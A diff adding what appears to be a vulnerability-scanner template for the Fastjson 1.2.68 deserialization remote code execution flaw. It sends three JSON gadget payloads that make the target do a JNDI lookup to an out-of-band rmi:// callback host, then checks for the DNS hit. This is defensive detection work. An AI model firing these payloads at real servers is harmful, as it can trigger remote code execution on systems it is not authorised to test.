@@ -1,0 +1,71 @@
+id: fastjson-1-2-68-rce
+brief:
+    title: Fastjson 1.2.68 - Remote Code Execution
+    by: zh
+    level: critical
+    about: Fastjson 1.2.68 is susceptible to a deserialization remote code execution vulnerability.
+    label:
+        - fastjson
+        - rce
+        - deserialization
+        - oast
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Content-Type: application/json
+      body: |-
+        {
+           "@type":"org.apache.shiro.jndi.JndiObjectFactory",
+           "resourceName":"rmi://{{interactsh-url}}/Exploit"
+        }
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Content-Type: application/json
+      body: |-
+        {
+           "@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
+           "jndiNames":"rmi://{{interactsh-url}}/Exploit"
+        }
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/'
+      head:
+        Content-Type: application/json
+      body: |-
+        {
+           "@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
+           "metricRegistry":"rmi://{{interactsh-url}}/Exploit"
+        }
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+        - "on": status
+          status:
+            - 200
